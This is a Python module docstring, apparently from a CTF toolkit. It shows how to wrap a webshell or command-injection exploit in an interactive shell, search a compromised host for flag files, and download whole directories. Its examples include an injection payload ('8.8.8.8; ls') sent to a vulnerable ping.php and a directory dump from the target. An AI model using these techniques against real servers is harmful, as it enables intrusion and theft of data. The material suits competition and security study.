"""
This modules provides utilities to "simulate" a nice shell even if you only
have something that only provides rudimentary command execution, such as a
webshell or a crude exploit. It also has several convenience methods to make it
easy to search for flags or download certain directories over the channel.

For example to create a such a simulated shell over a Tube, you can do this:

    >>> x = process("/bin/sh")
    >>> sh = ShellSim(x)
    >>> print sh.e("ls")  # execute a single command
    flag.txt something_else.txt pwnme
    >>> sh.interactive()  # switch to interactive mode
    >>> sh.close()  # also closes the tube

But we cannot only pass a tube, but also a function that implements an exploit.

    >>> def something(cmd):
    ...    r = remote("127.0.0.1", 1337)
    ...    r.sendline(cmd)
    ...    s = r.recvall()
    ...    r.close()
    ...    return s
    ...
    >>> sh = ShellSim(something)
    >>> sh.interactive()

For convenience there is also a client for webshells. In this example we create
a wrapper around the webshell. By default requests are performed using a get
request. In this example the contents returned by
`http://vuln.example.com/ws.php?cmd=ls` are printed directly.

    >>> ws = WebShellClient('http://vuln.example.com/ws.php', "cmd")
    >>> print ws.command("ls")
    flag.txt ws.php config.php
    >>> ws.interactive()

Sometimes we have a command execution vulnerability and not a complete
webshell. For example in the classical ping command execution scenario. Let's
assume that we need to actually pass an ip address first.

    >>> ws = WebShellClient("http://vuln.example.com/ping.php", "addr")
    >>> print ws.command("8.8.8.8; ls")
    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=56 time=14.4 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=56 time=14.0 ms
    64 bytes from 8.8.8.8: icmp_seq=3 ttl=56 time=13.8 ms

    --- 8.8.8.8 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2002ms
    rtt min/avg/max/mdev = 13.882/14.123/14.426/0.226 ms
    flag.txt
    ping.php
    >>> ws.pre = lambda cmd: "127.0.0.1; " + cmd
    >>> ws.post = shellsim.from_line(8)
    >>> print ws.command("ls")
    flag.txt
    ping.php


A very useful method for CTF scenarios is the following method:

    >>> sh = ShellSim(something)
    >>> # this will use the find command to print all the files
    >>> # that match the regex.
    >>> sh.print_all_files_like(".*flag.*", "/home/ctf/")
    ---- /home/ctf/flag.txt ----
    CTF{omgwtf_I_got_a_flag}
    ---- /home/ctf/somedir/real_flag.txt ----
    CTF{jk_this_is_the_r3al_flag}


    >>> pprint(sh.read_all_files_like(".*flag.*", '/home/ctf'))
    {'/home/ctf/flag.txt': 'CTF{omgwtf_I_got_a_flag}\n',
     '/home/ctf/somedir/real_flag.txt': 'CTF{jk_this_is_the_r3al_flag}\n'}

    >>> # wrapper to perform `grep -ri 'CTF' /home/ctf`
    >>> print sh.grep_for("CTF", "/home/ctf", i=True)
    ./flag.txt:CTF{omgwtf_I_got_a_flag}
    ./somedir/real_flag.txt:CTF{jk_this_is_the_r3al_flag}


If you want to dump the files from the server:

    >>> sh = ShellSim(something)
    >>> # this will download a .tar.gz file into './downloads', which contains
    >>> # the contents of /home/ctf
    >>> print sh.download("/home/ctf")
    Written contents of /home/ctf file to /home/user/downloads/_home_ctf-2016-10-13T15:32:33.tar.gz

When in interactive mode you can use the `:download` command to achieve the
same. Also the `:printlike` command is available as an alias for the
print_all_files_like method:

    >>> # same WebShellClient as above
    >>> ws.interactive()
    ctf@pwned /home/ctf/wstests/ping > ls
    something.php
    ping.php
    ctf@pwned /home/ctf/wstests/ping > :download /home/ctf
    Written contents of /home/ctf file to /home/user/downloads/_home_ctf-2016-10-13T16:04:01.tar.gz
    ctf@pwned /home/ctf/wstests/ping > :printlike .*flag.* /home/ctf/
    ---- /home/ctf/flag.txt ----
    CTF{omgwtf_I_got_a_flag}
    ---- /home/ctf/somedir/real_flag.txt ----
    CTF{jk_this_is_the_r3al_flag}


"""

from shellsim import *
import utils
